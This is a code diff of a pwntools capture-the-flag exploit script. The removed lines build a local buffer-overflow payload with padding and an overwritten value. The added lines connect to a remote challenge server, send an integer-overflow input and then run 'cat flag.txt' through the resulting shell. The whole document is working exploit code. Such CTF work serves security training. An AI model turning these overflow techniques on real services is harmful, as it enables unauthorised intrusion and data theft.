@@ -1,12 +1,9 @@
 from pwn import *
 
-p = process("./baby_bof")
-#pid = gdb.attach(p, gdbscript="b* vuln")
-p.recvline()
-
-mal = b'admin\0'
-mal += b'A' * (44 - len(mal))
-mal += p64(0x1337c0de)
-p.send(mal)
+p = remote("pwn.dctf.si", 13374)
+p.sendline(b"admin")
+p.sendline(b"1")
+p.sendline(b"9223372036854775807")
+p.sendline(b"cat flag.txt")
 
 p.interactive()
